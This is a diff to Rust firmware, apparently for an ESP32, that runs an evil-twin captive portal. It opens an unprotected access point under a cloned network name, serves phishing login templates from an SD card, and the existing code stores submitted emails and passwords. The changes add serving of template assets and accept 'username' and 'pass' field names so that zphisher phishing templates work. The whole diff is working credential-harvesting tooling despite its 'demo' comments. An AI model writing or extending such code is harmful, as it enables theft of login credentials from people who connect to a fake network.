@@ -193,6 +193,26 @@ fn save_credential_to_sd(ssid: &str, email: &str, password: &str) {
     }
 }
 
+/// Devine le Content-Type d'un asset servi depuis la SD, d'après l'extension.
+fn content_type(path: &str) -> &'static str {
+    let ext = path.rsplit('.').next().unwrap_or("").to_ascii_lowercase();
+    match ext.as_str() {
+        "html" | "htm" => "text/html; charset=utf-8",
+        "css" => "text/css",
+        "js" => "application/javascript",
+        "png" => "image/png",
+        "jpg" | "jpeg" => "image/jpeg",
+        "gif" => "image/gif",
+        "svg" => "image/svg+xml",
+        "ico" => "image/x-icon",
+        "webp" => "image/webp",
+        "woff" => "font/woff",
+        "woff2" => "font/woff2",
+        "json" => "application/json",
+        _ => "application/octet-stream",
+    }
+}
+
 // Fonction de décodage URL simple
 fn url_decode(s: &str) -> String {
     let mut result = String::new();
@@ -248,6 +268,14 @@ where
     // Partagés dans les handlers HTTP ('static) via Arc.
     let portal: Arc<str> = Arc::from(portal_path);
     let ap_ssid: Arc<str> = Arc::from(ssid);
+    // Dossier du portail : sert les assets relatifs (images/css/js) du template.
+    let portal_dir: Arc<str> = {
+        let d = std::path::Path::new(portal_path)
+            .parent()
+            .map(|p| p.to_string_lossy().into_owned())
+            .unwrap_or_default();
+        Arc::from(d.as_str())
+    };
 
     let mut wifi = BlockingWifi::wrap(EspWifi::new(modem, sys_loop.clone(), Some(nvs))?, sys_loop)?;
     // AP OUVERTE au nom cloné : join facile pour la démo (pas de mot de passe).
@@ -277,7 +305,12 @@ where
     let cred_count = Arc::new(AtomicUsize::new(0));
     let cred_count_clone = cred_count.clone();
 
-    let mut server = EspHttpServer::new(&HttpConfig::default())?;
+    // uri_match_wildcard : permet un handler `/*` catch-all pour les assets.
+    // Les templates sans `*` restent des matches exacts (/, /login, redirects).
+    let mut server = EspHttpServer::new(&HttpConfig {
+        uri_match_wildcard: true,
+        ..Default::default()
+    })?;
 
     // Page d'accueil : sert le template SD choisi (fallback = page intégrée).
     let portal_http = portal.clone();
@@ -343,9 +376,11 @@ where
 
                         let decoded = url_decode(value);
 
-                        if key == "email" {
+                        // `username` accepté comme alias d'`email` : certains
+                        // templates zphisher gardent ce nom de champ.
+                        if key == "email" || key == "username" {
                             email = decoded;
-                        } else if key == "password" {
+                        } else if key == "password" || key == "pass" {
                             password = decoded;
                         }
                     }
@@ -408,6 +443,34 @@ where
             Ok::<(), esp_idf_svc::io::EspIOError>(())
         })?;
     }
+
+    // Catch-all `/*` (enregistré EN DERNIER) : sert les assets du template
+    // (images, css, js) depuis le dossier SD du portail. Les handlers exacts
+    // (`/`, `/login`, redirects) déjà enregistrés priment.
+    let asset_dir = portal_dir.clone();
+    server.fn_handler("/*", Method::Get, move |req| {
+        let uri = req.uri().split('?').next().unwrap_or("/").to_string();
+        let rel = uri.trim_start_matches('/');
+        // Anti path-traversal : refuse `..`.
+        if rel.is_empty() || rel.contains("..") {
+            req.into_response(404, Some("Not Found"), &[])?.write(b"nf")?;
+            return Ok::<(), esp_idf_svc::io::EspIOError>(());
+        }
+        let full = format!("{}/{}", asset_dir, rel);
+        match std::fs::read(&full) {
+            Ok(data) => {
+                let ct = content_type(rel);
+                let mut resp = req.into_response(200, Some("OK"), &[("Content-Type", ct)])?;
+                for chunk in data.chunks(1024) {
+                    resp.write(chunk)?;
+                }
+            }
+            Err(_) => {
+                req.into_response(404, Some("Not Found"), &[])?.write(b"nf")?;
+            }
+        }
+        Ok::<(), esp_idf_svc::io::EspIOError>(())
+    })?;
 
     info!("✅ Serveur HTTP démarré - http://192.168.71.1");
     info!("📡 WiFi: FZ-Module / motdepasse123");
